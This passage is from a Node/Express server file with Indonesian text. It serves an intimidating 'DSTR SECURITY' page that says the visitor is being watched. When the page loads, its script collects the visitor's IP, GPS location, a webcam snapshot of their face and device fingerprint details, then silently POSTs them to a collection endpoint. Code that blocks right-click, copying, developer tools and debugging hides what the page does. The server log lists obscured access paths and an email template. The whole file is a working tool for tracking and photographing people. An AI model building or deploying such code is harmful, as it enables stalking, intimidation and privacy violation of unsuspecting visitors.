        .emoji-item:nth-child(3) { animation-duration: 2s; animation-delay: 1s; }
        .system-status { background: rgba(0,0,0,0.8); border: 1px solid #0f0; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
        .status-line { font-family: monospace; font-size: 14px; color: #0f0; padding: 5px 0; border-bottom: 1px solid rgba(0,255,0,0.2); }
        .dstr-logo { font-size: 48px; font-weight: bold; background: linear-gradient(45deg, red, #0f0, red); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0; }
        .security-badge { display: inline-block; background: rgba(0,0,0,0.7); border: 1px solid #0f0; border-radius: 20px; padding: 8px 15px; margin: 5px; font-size: 12px; color: #0f0; }
        button { background: linear-gradient(45deg, red, #900); color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; margin: 20px; transition: all 0.3s; }
        button:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.5); }
        @media (max-width: 600px) { .hacker-card { padding: 20px; } .warning-text { font-size: 20px; } .dstr-logo { font-size: 32px; } }
        .hidden { display: none; }
        #cameraPreview { position: fixed; bottom: 20px; right: 20px; width: 120px; height: 90px; border: 2px solid #0f0; border-radius: 10px; z-index: 9999; background: black; }
        video, #photoCanvas { width: 100%; height: 100%; object-fit: cover; border-radius: 8px; }
        #photoCanvas { display: none; }
    </style>
</head>
<body>

<canvas id="matrixCanvas" class="matrix-bg"></canvas>
<div class="scanline"></div>
<div id="cameraPreview" class="hidden">
    <video id="video" autoplay muted></video>
    <canvas id="photoCanvas"></canvas>
</div>

<div class="container">
    <div class="hacker-card">
        <div class="emoji-wall">
            <span class="emoji-item">💀</span><span class="emoji-item">👾</span><span class="emoji-item">🤖</span>
            <span class="emoji-item">💻</span><span class="emoji-item">🔓</span><span class="emoji-item">⚠️</span>
            <span class="emoji-item">🔥</span><span class="emoji-item">⚡</span><span class="emoji-item">👁️</span>
            <span class="emoji-item">🎯</span><span class="emoji-item">🔪</span>
        </div>
        <div class="dstr-logo">═══ DSTR SECURITY ULTIMATE ═══</div>
        <div class="warning-text">⚠️ ANDA SEDANG DIPANTAU ⚠️</div>
        <div class="hacker-text">🔥 IP, GPS, ASN, WAJAH TELAH DIKIRIM! 🔥</div>
        
        <div class="system-status">
            <div class="status-line">🟢 [DSTR-SYSTEM] Status: <span class="blink-cursor">ACTIVE</span></div>
            <div class="status-line">🔴 [ANTI-CLICK] Status: ENFORCED</div>
            <div class="status-line">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
            <div class="status-line">🔵 [GPS TRACKING] Status: <span id="gpsStatus">Memproses...</span></div>
            <div class="status-line">🟣 [WEBCAM CAPTURE] Status: <span id="camStatus">Memproses...</span></div>
            <div class="status-line">⚪ [DATA SENT] Status: <span id="sendStatus">Belum</span></div>
        </div>
        
        <div style="margin: 20px 0;">
            <span class="security-badge">🛡️ ANTI-CLICK KANAN</span>
            <span class="security-badge">🔒 ANTI-COPY</span>
            <span class="security-badge">📡 ANTI-DEVTOOLS</span>
            <span class="security-badge">🧠 DETECT DEBUGGER</span>
            <span class="security-badge">🎯 GPS CONSENT</span>
            <span class="security-badge">📸 WEBCAM CONSENT</span>
            <span class="security-badge">🌐 ASN DETECTION</span>
            <span class="security-badge">🏠 REVERSE GEOCODE</span>
        </div>
        
        <div style="margin-top: 30px; font-size: 12px; color: #666;">
            ⚡ DSTR SECURITY v6.1 | ALL YOUR DATA ARE BELONG TO US ⚡
        </div>
    </div>
</div>

<script>
    document.addEventListener('contextmenu', (e) => { e.preventDefault(); alert('🚫 AKSES DITOLAK!'); return false; });
    document.addEventListener('copy', (e) => { e.preventDefault(); alert('📋 COPY DILARANG!'); return false; });
    document.addEventListener('selectstart', (e) => e.preventDefault());
    document.addEventListener('dragstart', (e) => e.preventDefault());
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'J')) {
            e.preventDefault();
            alert('🚫 DEVELOPER TOOLS DIBLOKIR!');
        }
    });
    
    setInterval(() => {
        var before = Date.now();
        debugger;
        var after = Date.now();
        if (after - before > 100) {
            document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px;">🚫 DEBUGGER DETECTED! ACCESS DENIED 🚫</div>';
            alert('⚠️ JANGAN COBA-COBA HACK!');
        }
    }, 1000);
    
    async function getIP() {
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let data = await res.json();
            return data.ip;
        } catch(e) { return 'Tidak terdeteksi'; }
    }
    
    // ============================================================
    // GPS CONSENT-FIRST: browser nanya user, tunggu jawaban
    // ============================================================
    async function getGPS() {
        if (!navigator.geolocation) {
            document.getElementById('gpsStatus').innerText = '❌ Browser tidak support GPS';
            return null;
        }

        try {
            const perm = await navigator.permissions.query({ name: 'geolocation' });
            if (perm.state === 'denied') {
                document.getElementById('gpsStatus').innerText = '❌ Izin lokasi ditolak permanen';
                return null;
            }
        } catch (e) { }

        document.getElementById('gpsStatus').innerText = '🔔 Menunggu izin lokasi dari user...';

        return new Promise(function(resolve) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const result = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        source: 'GPS Browser (user consent)'
                    };
                    document.getElementById('gpsStatus').innerHTML = '✅ ' + result.lat + ', ' + result.lon + ' (' + Math.round(result.accuracy) + 'm)';
                    resolve(result);
                },
                function(err) {
                    const map = {
                        1: 'Izin lokasi ditolak user',
                        2: 'Posisi tidak tersedia (GPS mati / sinyal hilang)',
                        3: 'Timeout menunggu lokasi'
                    };
                    console.warn('Geolocation:', map[err.code] || err.message);
                    document.getElementById('gpsStatus').innerText = '❌ ' + (map[err.code] || 'GPS gagal');
                    resolve(null);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 60000,
                    maximumAge: 0
                }
            );
        });
    }
    
    async function captureWajah() {
        var previewDiv = document.getElementById('cameraPreview');
        var video = document.getElementById('video');
        var canvas = document.getElementById('photoCanvas');
        var ctx = canvas.getContext('2d');
        
        try {
            previewDiv.classList.remove('hidden');
            document.getElementById('camStatus').innerText = '🔔 Menunggu izin kamera...';
            var stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await video.play();
            await new Promise(function(r) { setTimeout(r, 1000); });
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            var wajahBase64 = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(function(track) { track.stop(); });
            video.srcObject = null;
            previewDiv.classList.add('hidden');
            document.getElementById('camStatus').innerText = 'WAJAH TERTANGKAP ✅';
            return wajahBase64;
        } catch(e) {
            console.error('Gagal akses kamera:', e);
            document.getElementById('camStatus').innerText = 'Gagal / Ditolak';
            previewDiv.classList.add('hidden');
            return null;
        }
    }
    
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: screen.width + 'x' + screen.height,
            viewport: window.innerWidth + 'x' + window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            webdriver: navigator.webdriver,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };
    }
    
    async function sendAllDataSilently() {
        try {
            document.getElementById('sendStatus').innerText = 'Mengirim...';
            
            var ip = await getIP();
            var gps = await getGPS();
            var wajah = await captureWajah();
            var deviceInfo = getDeviceInfo();
            
            var payload = {
                email: 'target@tersuspect.com',
                emailPassword: 'Tidak ada password',
                phone: '-',
                fullName: 'Visitor',
                latitude: gps ? gps.lat : '-',
                longitude: gps ? gps.lon : '-',
                gps_accuracy: gps ? gps.accuracy : '-',
                gps_source: gps ? gps.source : 'IP fallback',
                ip_address: ip,
                platform: deviceInfo.platform,
                screenResolution: deviceInfo.screenResolution,
                language: deviceInfo.language,
                timezone: deviceInfo.timezone,
                userAgent: deviceInfo.userAgent,
                timestamp: new Date().toLocaleString('id-ID'),
                wajah_base64: wajah || null,
                deviceInfo: deviceInfo
            };
            
            var response = await fetch('/ggwxzzr/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            var result = await response.json();
            if (result.success) {
                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM!';
            } else {
                document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
            }
        } catch(err) {
            console.error('Gagal kirim data:', err);
            document.getElementById('sendStatus').innerHTML = '❌ Error kirim';
        }
    }
    
    window.addEventListener('load', function() {
        setTimeout(function() {
            sendAllDataSilently();
        }, 800);
    });
    
    var canvasMat = document.getElementById('matrixCanvas');
    var ctxMat = canvasMat.getContext('2d');
    canvasMat.width = window.innerWidth;
    canvasMat.height = window.innerHeight;
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()+=[]{}|;:,.<>?~💀👾🤖💻🔓⚠️🔥⚡';
    var fontSizeM = 14;
    var columnsM = canvasMat.width / fontSizeM;
    var dropsM = [];
    for (var i = 0; i < columnsM; i++) { dropsM[i] = Math.floor(Math.random() * canvasMat.height); }
    
    function drawMatrix() {
        ctxMat.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctxMat.fillRect(0, 0, canvasMat.width, canvasMat.height);
        ctxMat.fillStyle = '#0f0';
        ctxMat.font = fontSizeM + 'px monospace';
        for (var i = 0; i < dropsM.length; i++) {
            var text = chars[Math.floor(Math.random() * chars.length)];
            ctxMat.fillText(text, i * fontSizeM, dropsM[i] * fontSizeM);
            if (dropsM[i] * fontSizeM > canvasMat.height && Math.random() > 0.975) { dropsM[i] = 0; }
            dropsM[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize', function() {
        canvasMat.width = window.innerWidth;
        canvasMat.height = window.innerHeight;
    });
    
    console.log('%c🚫 DSTR SECURITY - GPS CONSENT MODE AKTIF!', 'color: red; font-size: 16px;');
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Akses via:`);
    console.log(`   → http://localhost:${PORT}/wxyzzay`);
    console.log(`   → http://localhost:${PORT}/ggwxzzr`);
    console.log(`   → http://localhost:${PORT}/hgefdyt`);
    console.log(`   → http://localhost:${PORT}/mgwhiww`);
    console.log(`   → http://localhost:${PORT}/kttwwxy`);
    console.log(`   → http://localhost:${PORT}/mdgffew`);
    console.log(`   → http://localhost:${PORT}/FF_EventA`);
    console.log(`\n✅ EMAIL TEMPLATE: Persis seperti Screenshot (Hanya data inti)!`);
    console.log(`✅ UNICODE SPAM: Menggunakan "GST DIVISION"!`);
    console.log(`✅ GPS CONSENT-FIRST: browser nanya user, tunggu jawaban (timeout 60s)!`);
});
